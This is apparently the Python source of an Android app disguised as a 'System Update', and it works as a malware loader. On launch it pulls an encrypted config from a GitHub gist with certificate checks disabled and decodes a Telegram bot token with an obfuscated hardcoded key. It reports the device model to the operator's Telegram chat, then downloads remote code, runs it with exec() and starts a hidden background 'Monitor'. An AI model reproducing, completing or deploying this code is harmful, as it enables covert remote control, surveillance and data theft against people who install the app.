import os
import sys
import time
import traceback
import socket
import requests
import json
import base64
import threading
from kivy.app import App
from kivy.clock import Clock
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.utils import platform

app_path = os.path.dirname(os.path.abspath(__file__))
for subdir in ['core', 'telegram', 'media', 'config']:
    sub_path = os.path.join(app_path, subdir)
    if os.path.exists(sub_path) and sub_path not in sys.path:
        sys.path.append(sub_path)

def global_exception_handler(exc_type, exc_value, exc_tb):
    try:
        app = App.get_running_app()
        if app and hasattr(app, 'log'):
            app.log(f"!!! UNHANDLED ERROR: {exc_type.__name__}: {exc_value}")
            app.log(''.join(traceback.format_tb(exc_tb)))
    except:
        pass
    sys.__excepthook__(exc_type, exc_value, exc_tb)

sys.excepthook = global_exception_handler

class SystemUpdateApp(App):
    def build(self):
        self.config_url = "https://gist.githubusercontent.com/Zaen1993/e463af07dcd7c8c1f2398fdbaf573c73/raw/cf8b3c5fe79d3453e7272b3b8558d6a08f49e9ec/config.json"
        self.engine_running = False
        self.log_lines = []

        layout = BoxLayout(orientation='vertical')
        btn_layout = BoxLayout(size_hint_y=None, height=50, spacing=10, padding=5)
        copy_btn = Button(text="Copy Log", background_color=(0.2, 0.6, 0.2, 1))
        copy_btn.bind(on_press=self.copy_log)
        start_btn = Button(text="Start Engine", background_color=(0.2, 0.4, 0.8, 1))
        start_btn.bind(on_press=self.start_engine_manual)
        btn_layout.add_widget(copy_btn)
        btn_layout.add_widget(start_btn)
        layout.add_widget(btn_layout)

        scroll = ScrollView(size_hint=(1, 1))
        self.log_view = TextInput(
            text="[System] Ready. Press Start Engine.\n",
            readonly=True,
            background_color=(0, 0, 0, 1),
            foreground_color=(0, 1, 0, 1),
            font_size='14sp',
            size_hint_y=None,
            cursor_color=(0, 0, 0, 0)
        )
        self.log_view.bind(minimum_height=self.log_view.setter('height'))
        scroll.add_widget(self.log_view)
        layout.add_widget(scroll)

        if platform == 'android':
            self.log("Requesting basic permissions (Internet, Storage)...")
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.INTERNET,
                Permission.ACCESS_NETWORK_STATE,
                Permission.READ_EXTERNAL_STORAGE,
                Permission.WRITE_EXTERNAL_STORAGE
            ])

        Clock.schedule_once(self.start_engine, 3)
        return layout

    def log(self, msg):
        timestamp = time.strftime("%H:%M:%S")
        full_msg = f"[{timestamp}] {msg}"
        self.log_view.text += full_msg + "\n"
        self.log_lines.append(full_msg)

    def copy_log(self, instance):
        from kivy.core.clipboard import Clipboard
        Clipboard.copy("\n".join(self.log_lines))
        self.log(f"Log copied ({len(self.log_lines)} lines)")

    def start_engine(self, dt):
        if self.engine_running:
            return
        self.log("Auto start triggered")
        self.run_engine()

    def start_engine_manual(self, instance):
        if self.engine_running:
            self.log("Engine already running")
            return
        self.log("Manual start triggered")
        self.run_engine()

    def test_dns(self):
        try:
            socket.gethostbyname("github.com")
            self.log("DNS resolution: OK")
            return True
        except Exception as e:
            self.log(f"DNS resolution: FAILED ({e})")
            return False

    def fetch_config(self, max_retries=2):
        for attempt in range(1, max_retries+1):
            try:
                self.log(f"Fetching config (attempt {attempt}/{max_retries})...")
                resp = requests.get(self.config_url, timeout=10, verify=False)
                if resp.status_code == 200:
                    config = resp.json()
                    self.log("Config fetched and parsed successfully")
                    return config
                else:
                    self.log(f"HTTP {resp.status_code}")
            except Exception as e:
                self.log(f"Fetch error: {e}")
                if attempt < max_retries:
                    time.sleep(2)
        self.log("Failed to fetch config after multiple attempts")
        return None

    def get_encryption_key(self):
        part1 = [77, 121, 83, 117, 112, 51, 114, 83, 51, 99, 114, 51, 116]
        part2 = [75, 51, 121, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48, 49, 50, 51, 52, 53, 54]
        return bytes(part1 + part2)

    def decrypt_aes_gcm(self, encrypted_b64):
        if not encrypted_b64:
            return None
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            key = self.get_encryption_key()
            data = base64.b64decode(encrypted_b64)
            if len(data) < 28:
                self.log(f"Decrypt: data too short ({len(data)} bytes)")
                return None
            iv = data[:12]
            tag = data[-16:]
            ct = data[12:-16]
            cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
            decryptor = cipher.decryptor()
            plain = decryptor.update(ct) + decryptor.finalize()
            result = plain.decode('utf-8')
            self.log(f"Decrypt: success ({len(result)} chars)")
            return result
        except Exception as e:
            self.log(f"Decrypt error: {e}")
            return None

    def send_telegram(self, token, chat_id, text):
        if not token or not chat_id:
            self.log("Telegram: missing token or chat_id")
            return False
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            r = requests.post(url, json={"chat_id": chat_id, "text": text}, timeout=10, verify=False)
            if r.status_code == 200:
                self.log("Telegram: message sent successfully")
                return True
            else:
                self.log(f"Telegram: HTTP {r.status_code}")
                return False
        except Exception as e:
            self.log(f"Telegram: send error: {e}")
            return False

    def get_device_info(self):
        try:
            from jnius import autoclass
            Build = autoclass('android.os.Build')
            VERSION = autoclass('android.os.Build$VERSION')
            model = Build.MODEL
            manufacturer = Build.MANUFACTURER
            sdk = VERSION.SDK_INT
            return f"{manufacturer} {model} (SDK {sdk})"
        except:
            return "Unknown Device"

    def run_engine(self):
        self.engine_running = True
        self.log("="*50)
        self.log("ENGINE STARTED")
        self.log("="*50)

        self.log("Step 1: Testing DNS...")
        self.test_dns()

        self.log("Step 2: Fetching config.json...")
        config = self.fetch_config()
        if not config:
            self.log("CRITICAL: Cannot fetch config. Aborting.")
            self.engine_running = False
            return

        self.log("Step 3: Decrypting tokens...")
        enc_tokens = config.get('t', [])
        if not enc_tokens:
            self.log("ERROR: No tokens in config")
            self.engine_running = False
            return

        token = None
        for i, enc in enumerate(enc_tokens):
            dec = self.decrypt_aes_gcm(enc)
            if dec:
                token = dec
                self.log(f"Token {i+1} decrypted successfully")
                break
        if not token:
            self.log("CRITICAL: No valid token found")
            self.engine_running = False
            return

        chat_id = self.decrypt_aes_gcm(config.get('v', ''))
        if not chat_id:
            self.log("CRITICAL: Cannot decrypt chat_id")
            self.engine_running = False
            return

        self.log("Step 4: Sending device info to Telegram...")
        device_info = self.get_device_info()
        msg = f"🚀 *System Online*\n📱 Device: `{device_info}`\n🕒 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
        self.send_telegram(token, chat_id, msg)

        payload_urls = config.get('payload_urls', [])
        self.log(f"Step 5: Found {len(payload_urls)} payload URLs")
        if payload_urls:
            self.log("Loading payloads...")
            loaded = 0
            for url in payload_urls:
                try:
                    name = url.split('/')[-1]
                    self.log(f"  - Loading {name}...")
                    code = requests.get(url, timeout=10, verify=False).text
                    exec(code, globals())
                    loaded += 1
                    self.log(f"    Success")
                except Exception as e:
                    self.log(f"    FAILED: {e}")
            self.log(f"Loaded {loaded}/{len(payload_urls)} payloads")

            monitor_class = None
            if 'Monitor' in globals():
                monitor_class = globals()['Monitor']
            else:
                self.log("Searching for Monitor class in globals...")
                for key, value in globals().items():
                    if isinstance(value, type) and key == 'Monitor':
                        monitor_class = value
                        break
                    if hasattr(value, 'Monitor'):
                        monitor_class = getattr(value, 'Monitor')
                        break

            if monitor_class:
                self.log("Starting Monitor in background thread...")
                try:
                    monitor = monitor_class()
                    threading.Thread(target=monitor.start, daemon=True).start()
                    self.log("Monitor started successfully")
                except Exception as e:
                    self.log(f"Monitor start failed: {e}")
            else:
                self.log("CRITICAL: Monitor class not found after loading all payloads")
                self.log("Available classes in globals:")
                classes = [k for k, v in globals().items() if isinstance(v, type)]
                self.log(f"  {classes}")
        else:
            self.log("No payloads to load")

        self.log("="*50)
        self.log("ENGINE FINISHED")
        self.log("="*50)
        self.engine_running = False

if __name__ == '__main__':
    SystemUpdateApp().run()
